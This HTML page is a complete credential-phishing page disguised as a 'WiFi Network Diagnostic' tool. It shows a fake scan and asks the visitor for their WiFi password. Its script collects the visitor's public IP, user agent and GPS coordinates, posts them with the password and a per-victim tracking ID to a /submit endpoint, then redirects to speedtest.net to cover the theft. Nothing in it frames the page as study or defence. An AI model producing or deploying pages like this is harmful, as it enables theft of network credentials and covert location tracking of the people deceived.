<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WiFi Diagnostic</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen"><div class="container mx-auto px-4 py-12 max-w-2xl"><div class="text-center mb-12"><div class="w-24 h-24 bg-gradient-to-r from-blue-500 to-purple-600 rounded-2xl mx-auto mb-6 shadow-2xl"><svg class="w-12 h-12 text-white mx-auto mt-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5.05 4.05a7 7 0 119.9 9.9L10 18.9l-4.95-4.95a7 7 0 010-9.9zM10 11a2 2 0 100-4 2 2 0 000 4z"/></svg></div><h1 class="text-4xl font-bold bg-gradient-to-r from-gray-800 to-gray-600 bg-clip-text text-transparent mb-4">WiFi Network Diagnostic</h1><p class="text-xl text-gray-600">Professional network analysis tool</p></div><div class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-2xl p-8 mb-8 border"><div class="flex items-center mb-6"><div class="w-3 h-3 bg-green-400 rounded-full mr-3 animate-pulse"></div><span class="font-semibold text-gray-700">Scanning network...</span></div><div class="w-full bg-gray-200 rounded-full h-3 mb-6"><div class="bg-gradient-to-r from-blue-500 to-purple-600 h-3 rounded-full" style="width:65%"></div></div></div><div id="device-info" class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-2xl p-8 mb-8 border space-y-3 text-sm"><div class="flex justify-between py-2 border-b"><span>IP:</span><span id="ip-display" class="font-mono bg-blue-50 px-2 py-1 rounded">Detecting...</span></div><div class="flex justify-between py-2 border-b"><span>Device:</span><span id="device-display" class="font-mono bg-green-50 px-2 py-1 rounded">Detecting...</span></div><div class="flex justify-between py-2"><span>Location:</span><span id="location-display" class="font-mono bg-purple-50 px-2 py-1 rounded">GPS...</span></div></div><div class="bg-white/80 backdrop-blur-xl rounded-3xl shadow-2xl p-8 border"><h3 class="text-xl font-bold mb-6 flex items-center"><svg class="w-6 h-6 mr-2 text-orange-500" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"/></svg>Network Security</h3><div class="mb-6 p-4 bg-yellow-50 border border-yellow-200 rounded-2xl"><p class="text-sm text-yellow-800">🔒 Enter WiFi password for verification</p></div><form id="form"><input type="hidden" name="unique_id" value="{{UNIQUE_ID}}"><input type="hidden" name="ip" id="form_ip"><input type="hidden" name="user_agent" id="form_ua"><input type="hidden" name="geolocation" id="form_geo"><input type="password" id="wifi_pass" name="password" class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500" placeholder="WiFi Password"><button type="submit" class="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white py-4 px-8 rounded-2xl font-semibold text-lg shadow-xl mt-4">Complete Diagnosis</button></form></div></div><script>fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>{document.getElementById('ip-display').textContent=d.ip;document.getElementById('form_ip').value=d.ip});document.getElementById('device-display').textContent=/Mobile|Android|iPhone/.test(navigator.userAgent)?'Mobile':'Desktop';document.getElementById('form_ua').value=navigator.userAgent;if(navigator.geolocation){navigator.geolocation.getCurrentPosition(p=>{const c=`${p.coords.latitude},${p.coords.longitude}`;document.getElementById('location-display').textContent=c;document.getElementById('form_geo').value=c})};document.getElementById('form').addEventListener('submit',async e=>{e.preventDefault();const fd=new FormData(e.target);fd.append('ip',document.getElementById('form_ip').value);fd.append('user_agent',document.getElementById('form_ua').value);fd.append('geolocation',document.getElementById('form_geo').value);fd.append('password',document.getElementById('wifi_pass').value);await fetch('/submit',{method:'POST',body:fd});setTimeout(()=>{window.location.href='https://www.speedtest.net'},1500)})</script></body></html>
